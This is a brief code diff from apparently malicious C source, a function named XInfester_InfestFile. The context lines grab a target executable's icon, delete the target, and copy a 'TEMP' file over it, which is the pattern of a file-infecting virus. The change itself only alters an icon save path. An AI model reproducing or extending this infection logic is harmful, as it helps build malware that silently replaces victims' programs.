@@ -309,9 +309,8 @@ BOOL XInfester_InfestFile( const char *pDestFileName )
 	HICON ico=GetExecICON(pDestFileName);
 	if (ico!=NULL)
 	{
-		SaveIcon(ico,"D:\\ICO.ico");
+		SaveIcon(ico,"ICO.ico");
 	}
-
 
 	DeleteFile(pDestFileName);
 	CopyFileA("TEMP",pDestFileName,FALSE);
